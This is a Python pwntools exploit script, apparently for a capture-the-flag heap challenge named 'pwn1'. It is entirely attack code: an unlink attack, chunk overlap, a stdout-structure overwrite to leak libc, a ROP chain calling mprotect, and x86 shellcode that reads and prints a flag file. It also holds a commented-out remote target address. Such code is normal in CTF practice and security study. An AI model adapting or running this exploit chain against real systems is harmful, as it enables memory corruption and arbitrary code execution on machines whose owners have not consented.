#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys
import random

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"



def add(size,content):

    p.sendline("1")
    p.recvuntil("size:\n")
    p.send(str(size))
    time.sleep(0.2)
    p.recvuntil("buf:\n")
    p.send(content)
    p.recvuntil(">\n")

def delete(idx):

    p.sendline("2")
    p.recvuntil("index:\n")
    p.sendline(str(idx))
    p.recvuntil(">\n")

def edit(idx,size,content):

    p.sendline("3")
    p.recvuntil("index:\n")
    p.sendline(str(idx))
    p.recvuntil("size:\n")
    p.send(str(size))
    time.sleep(0.1)
    p.recvuntil("buf:\n")
    p.send(content)
    data = p.recvuntil(">\n")
    return data

def copy(src_idx, dst_idx, length):

    p.sendline("4")
    p.recvuntil("index:\n")
    p.sendline(str(src_idx))
    p.recvuntil("index:\n")
    p.sendline(str(dst_idx))
    p.recvuntil("length:\n")
    p.send(str(length))
    p.recvuntil(">\n")


bss = 0x6021a0

while 1:
    p = process("./pwn1")
	#p = remote("124.16.75.162",40002)

    p.recvuntil(">\n")
    #unlink attack.
    add(0x168, "afang") #0
    add(0x168, "afang") #1
    add(0xc0, "afang")  #2

    fake_pre  = 0x160
    fake_size = 0x170
    fake_fd = 0x6021a0 - 0x18
    fake_bk = 0x6021a0 - 0x10
    payload = p64(0) + p64(0x161) + p64(fake_fd) + p64(fake_bk)
    payload += 0x140 * "a"
    payload += p64(fake_pre) + p64(fake_size)

    edit(0, 0x200, payload)
    #wait("before unlink")
    delete(1)
    edit(0, 0x100, "a" * 0x18 + p64(bss))
    add(0x2d0 - 0x10, "afang") #3
    #wait("after unlink.")

    #construct chunk.

    add(0x60, "afang") #4
    add(0x60, "afang") #5
    #wait("test")
    delete(2)
    add(0x50, "afang") #6
    add(0x60, "afang") #7
    delete(7)
    #wait("test")
    edit(2 , 0xc0 ,p64(0) * 0xb + p64(0xe1))
    #wait("test")
    delete(7)
    edit(2, 0xc0, p64(0) * 0xb + p64(0x71))

    #go
    edit(7, 0xc0 ,"\xdd\x25")
    #wait("after chunk overlap!")
    try:
        add(0x60, "afang") #8
        add(0x60, "gogogo") #9
    except:
        p.close()
        print "[*]Retry.."
        continue

    data = edit(9, 0x60, "a" * 3 + p64(0)*6 + p64(0xfbad3887) + p64(0) * 3 + "\xe0\x25")
    libc = u64(data[:6].ljust(8,"\x00")) - 0x3c4660
    print hex(libc)
    wait("[*]now we Got Libc.")

    #now , drag stack var into bss. 

    prog_invoke_name = libc + 0x3c53d8
    edit(0, 0x40, p64(bss) + p64(prog_invoke_name) + p64(0x602500) + p64(bss) + p64(0x602600))
    copy(1,0,8)
    edit(4, 0x40, "flag")

    #copy finish ,now stack spray!!
    x86_shellcode = asm("mov eax,0x5; mov ebx,0x602600; mov ecx,0; int 0x80; mov ebx,eax; mov eax,3; mov ecx,0x602700; mov edx,0x40; int 0x80; mov eax,4; mov ebx,1; mov ecx, 0x602700; mov edx,0x40; int 0x80")

    #set shellcode
    edit(2, 0x80, x86_shellcode)

    sprayer = p64(libc + 0x00000000000080d8) #nop;ret 

    mprotect_func = libc + 0x0000000000101770
    pop_rdi = 0x0000000000400ca3 #pop rdi;ret 
    pprsi = 0x0000000000400ca1 #pop rsi; pop r15;ret 
    pop_rdx = 0x0000000000001b92 + libc #pop rdx; ret

    mprotect_pay = p64(pop_rdi) + p64(0x602000) + p64(pprsi) + p64(0x1000) + p64(0) + p64(pop_rdx) + p64(7) + p64(mprotect_func) + p64(0x602500)

    spray = sprayer * 50 + mprotect_pay #50/59
    #let's go !
    wait("before spray")
    counter = 0
    c = 0
    while c < 100000:
        edit(5, 472, spray)
        edit(3, 2, p16(counter))
        copy(5,0, 472)
        counter += 472
        c += 1
    p.interactive()
